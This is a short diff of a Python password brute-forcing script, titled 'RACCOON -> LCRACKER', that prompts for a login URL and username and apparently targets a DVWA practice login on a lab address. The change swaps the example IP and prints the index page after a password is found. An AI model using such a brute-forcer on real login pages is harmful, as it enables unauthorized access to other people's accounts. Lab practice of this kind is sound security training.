@@ -8,7 +8,7 @@ banner = pyfiglet.figlet_format("RACCOON -> LCRACKER")
 cprint(banner, 'blue')
 
 # Asking the user for a URL anda username to use in the attack
-url = input("What URL do you want to bruteforce? (ex.http://192.168.142.137/dvwa/login.php): ")
+url = input("What URL do you want to bruteforce? (ex.http://192.168.142.138/dvwa/login.php): ")
 username = input("What username do you want to try? (ex admin): ")
 
 
@@ -41,6 +41,7 @@ try:
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
+        cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
 
 except:
     cprint("There was an error, please try again..", 'red')
